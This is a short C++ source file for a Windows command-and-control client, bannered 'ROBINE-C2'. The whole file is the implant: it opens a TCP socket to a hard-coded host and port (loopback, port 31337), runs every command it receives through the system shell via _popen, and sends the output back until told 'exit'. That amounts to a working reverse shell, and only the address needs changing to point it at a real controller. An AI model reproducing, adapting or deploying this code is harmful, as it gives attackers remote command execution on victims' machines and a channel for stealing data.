#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>

//dont_tell_batman

 //+-+-+-+-+-+-+-+-+-+
 //|R|O|B|I|N|E|-|C|2|
 //+-+-+-+-+-+-+-+-+-+
                                              
                                                   


#pragma comment(lib, "ws2_32.lib")

std::string executeCommand(const std::string& command) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "Error opening pipe!";
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        return "Error executing command!";
    }
    _pclose(pipe);
    return result;
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(31337);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");  

    connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    char buffer[4096];
    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            break;
        }

        std::string command(buffer, bytesReceived);
        if (command == "exit") {
            break;
        }

        std::string output = executeCommand(command);
        send(clientSocket, output.c_str(), output.size(), 0);
    }

    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
